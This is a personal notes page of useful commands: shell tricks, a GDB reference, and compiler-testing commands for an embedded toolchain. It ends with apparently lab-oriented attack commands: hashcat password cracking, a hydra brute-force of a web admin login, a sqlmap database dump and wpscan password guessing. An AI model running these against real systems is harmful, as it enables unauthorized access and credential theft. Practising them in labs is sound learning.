---
title: "Useful Commands Dump"
tags:
  - help
  - work
---
# Useful Commands Dump
---

Well... where I dump any useful commands I find and them hopefully I'll categorise them... eventually...

## Terminal
* Change file extension of all files:
```bash
for file in *.txt; do mv "$file" "${file%.txt}.md"; done
```

* If Git is hanging after total is because:
```bash
git config --global http.postBuffer 157286400
```

## GDB
| Command                      | Description                                                      |
| ---------------------------- | ---------------------------------------------------------------- |
| `gdb --args <binary> <args>` | Start the program with an argument list.                         |
| `b FileName:linenum`         | For setting a breakpoint.                                        |
| `bt`                         | For getting backtrace.                                           |
| `thread apply all bt`        | For getting the backtrace of all threads.                        |
| `p variableName`             | For printing the value of a variable/object.                     |
| `up`                         | For going up the stack frame.                                    |
| `down`                       | For going down the stack frame.                                  |
| `l`                          | For listing source lines of code around the current stack frame. |
| `disassemble`                | For showing the assembly code of the current function.           |
| `n`                          | For executing the next source instruction.                       |
| `si`                         | For executing the next machine instruction.                      |
| `q`                          | To quit the debugger.                                            |
| `r`                          | To run the program.                                              |

The docs are [here](https://www.gnu.org/software/gdb/documentation/).
More info on [GDB](notes/gdb.md).

## The dump of dumps

### BSC/Tiger related
```bash
runtest --tool=gcc --tool_exec=bsc-elf-clang  --tool_opts= --directory=${HOME}/tiger/gcc-for-llvm-testing/gcc/testsuite/gcc.target --srcdir=${HOME}/tiger/gcc-for-llvm-testing/gcc/testsuite --target_board=bsc-embdebug --target=bsc-elf "bsc.exp=bsc/or.c"
```

```bash
export PATH=${HOME}/riscv32-clang-gcc-testing/install/bin:$PATH
export BSC_TIMEOUT=300
export BSC_TRIPLE=bsc-elf
export BSC_SIM_COMMAND=bsc-run
export BSC_SIM_FLAGS=
export DEJAGNU=${HOME}/tiger/toolchain/site.exp
export TOOLDIR=${HOME}/tiger/toolchain/
```

```bash
bsc-elf-gdb -ex 'target remote | embdebug --soname bsc --stdin' -ex 'break exit' -ex 'break abort' test2.exe
```

```bash
llvm-objdump -d <testobject>
```

```bash
bsc-run --max-steps=200 --trace-inst --trace-regs --trace-stack ds.exe 2>&1 | tee output.txt
```

```bash
pietraferreira@tom:~/insn-test-tiger$ bsc-elf-gdb -ex 'target remote | embdebug --soname bsc --stdin' -ex 'break exit' -ex 'break abort' sub.exe
```

Ask the front end to produce unoptimised LLVM IR:
```bash
bsc-elf-clang -Wall -O0 -S -emit-llvm --target=bsc 20180309-1.c -o 20180309-1.ll
```

Compile but stop at assembly:
```bash
llc --debug -mtriple=bsc 20180309-1.ll -o 20180309-1.s
```

```bash
llvm-objdump -d sim-test.exe
```

```bash
bsc-elf-gdb sim-test.exe -ex "target remote | embdebug --soname sysc-bsc --vcd=trace-do --debug=0x00070000 --clk-mhz=1 --sim-cycles=10000 --stdin" -ex load -ex c -ex detach -ex quit 2>&1 | tee sim-test.log
```

## Website URL Fix
```bash
grep -rl 'notes/images' . | sort | uniq | xargs perl -e "s/assets/assets\/engineer-training/" -pi
```

## Hashcat
```bash
hashcat -m 1000 pass.txt ../Desktop/rockyou.txt
```

## Hydra
```bash
hydra -l admin -P ../Desktop/rockyou.txt 10.10.187.151 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=iL08cD6b3clJctyo0KNeEsuXx9w7SrkAtggDy0m16fdgDu1lU1uuo3uh6%2FRluRbkD9GutlhMGTHkzw5TKQ%2BHgSoGVo73vHE7yAY2Vsky3EyktnYS%2BIy0jb68wZvhEHGpOLmwYsk3M7NnT45B%2B2jaDdrRfwr94Ks2d1VIKp2LvcNs%2F6rd&__EVENTVALIDATION=5N%2Bcad1wYajo0H2m7Bq3nlBqYeKcha9MeicRSms1xOrJ8b9v%2FiDF9nj6Kge38NGN6KBMhWEtiNyCZFWTMItDUQu34YiMN8vVxQv6lQEgBw5RWhtEihlALnJsM5gAhf89mlKiwmAbHq2Lz0jR30paNwnGrt5M%2Fwj7m6oohs8%2F8JQKoaoM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
```

## SQLmap
```bash
sqlmap -r request.txt --dbms=mysql --dump
```

## Wordpress
Enumeration:

```bash
wpscan --url 10.10.101.40/blog
```

Look for vulnerable plugins and usernames:

```bash
wpscan --url 10.10.101.40/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```